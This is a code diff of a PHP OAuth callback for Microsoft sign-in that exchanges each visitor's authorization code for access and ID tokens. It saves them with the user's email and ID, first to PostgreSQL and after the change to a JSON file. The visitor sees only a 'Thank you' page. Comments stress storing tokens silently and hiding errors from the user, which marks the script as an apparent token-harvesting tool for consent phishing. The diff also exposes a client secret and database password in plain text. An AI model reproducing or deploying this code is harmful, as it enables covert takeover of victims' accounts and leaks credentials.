@@ -5,15 +5,12 @@ $client_secret = 'de38Q~901_U0wQBpNYt5hhoNNJqBUs4CehuQFaiM';
 $redirect_uri = 'https://render-php-oauth.onrender.com/callback.php';
 $token_url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
 
-// --- DB (Render PostgreSQL) ---
-$db_host = 'dpg-d5vv58soud1c738tk8sg-a.virginia-postgres.render.com';
-$db_name = 'oauth_db_xiqr';
-$db_user = 'oauth_db_xiqr_user';
-$db_pass = 'm9MGFrvs6EbuxQACEDh9HWy43KCaKlsV';
+// --- FILE TO STORE TOKENS ---
+$token_file = __DIR__ . '/tokens.json';
 
 // --- START ---
 if (!isset($_GET['code'])) {
-    echo 'Thank you.';
+    echo 'Thank you!';
     exit;
 }
 
@@ -39,7 +36,7 @@ $context = stream_context_create([
 
 $response = @file_get_contents($token_url, false, $context);
 if ($response === false) {
-    echo 'Thank you.';
+    echo 'Thank you!';
     exit;
 }
 
@@ -51,18 +48,22 @@ $payload = json_decode(
     true
 );
 
-$oid   = $payload['oid'] ?? null;
-$email = $payload['preferred_username'] ?? null;
+$user_data = [
+    'oid' => $payload['oid'] ?? null,
+    'email' => $payload['preferred_username'] ?? null,
+    'access_token' => $token['access_token'],
+    'id_token' => $token['id_token'],
+    'created_at' => date('c')
+];
 
-// Store silently in PostgreSQL
-try {
-    $pdo = new PDO("pgsql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
-    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-    $stmt = $pdo->prepare("INSERT INTO oauth_users (oid, email, access_token, id_token) VALUES (?, ?, ?, ?)");
-    $stmt->execute([$oid, $email, $token['access_token'], $token['id_token']]);
-} catch (PDOException $e) {
-    // silently fail, do not show to user
+// Save to JSON file (append new token)
+$all_tokens = [];
+if (file_exists($token_file)) {
+    $all_tokens = json_decode(file_get_contents($token_file), true) ?? [];
 }
+
+$all_tokens[] = $user_data;
+file_put_contents($token_file, json_encode($all_tokens, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
 
 // User sees only this
 echo "<h2>Thank you! You may now close this page.</h2>";
